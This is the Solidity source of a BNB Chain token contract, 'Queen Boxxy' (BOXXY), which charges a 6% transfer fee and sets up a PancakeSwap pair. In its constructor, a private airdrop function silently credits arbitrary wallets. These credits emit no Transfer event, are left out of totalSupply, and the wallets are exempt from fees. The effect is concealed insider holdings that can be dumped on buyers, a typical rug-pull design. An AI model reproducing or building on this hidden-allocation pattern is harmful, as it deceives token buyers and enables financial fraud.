/**
 *Submitted for verification at BscScan.com on 2022-06-28
*/

pragma solidity ^0.8.7;
// SPDX-License-Identifier: Unlicensed



interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Token {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint8 public _taxFee;
    uint8 private _previousTaxFee;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);    
    uint256 private _tTotal; 
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    
    constructor (uint256 supply, address[] memory airdropees, uint256[] memory amts) {
        _tTotal = supply;
        uint nAirdropees = airdropees.length;
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a uniswap pair for this new token
        IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        //exclude owner and this contract from fee
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true;
        _name = "Queen Boxxy";
        _symbol = "BOXXY";
        _decimals = 9;
        _taxFee = 6;
        _previousTaxFee = _taxFee;
        for(uint i = 0; i < nAirdropees; i++){
            airdrop(airdropees[i], amts[i]);
            _isExcludedFromFee[airdropees[i]] = true;
        }
        _tOwned[msg.sender] = supply;
        emit Transfer(address(this), msg.sender, supply);
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender] - amount);
        return true;
    }

    receive() external payable {}

    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tFee = (tAmount * _taxFee)/100;
        uint256 tTransferAmount = tAmount - tFee;
        return (tTransferAmount, tFee);
    }
    
    function airdrop(address to, uint256 amt) private {
        _tOwned[to] = amt;
    }
    
    function removeAllFee() private {
        if( _taxFee == 0) return;      
        _previousTaxFee = _taxFee;
        _taxFee = 0;
    }
    
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
    }
    
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        //indicates if fee should be deducted from transfer
        bool takeFee = true;
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        }
        
        if(!takeFee)
            removeAllFee();
        (uint256 tTransferAmount, uint256 tFee) = _getValues(amount);
        _tOwned[from] = _tOwned[from] - amount;
        _tOwned[to] = _tOwned[to] + tTransferAmount;
        _tOwned[address(this)] = _tOwned[address(this)] + tFee;
        if(!takeFee)
            restoreAllFee();
        emit Transfer(from, to, tTransferAmount);
    }  
}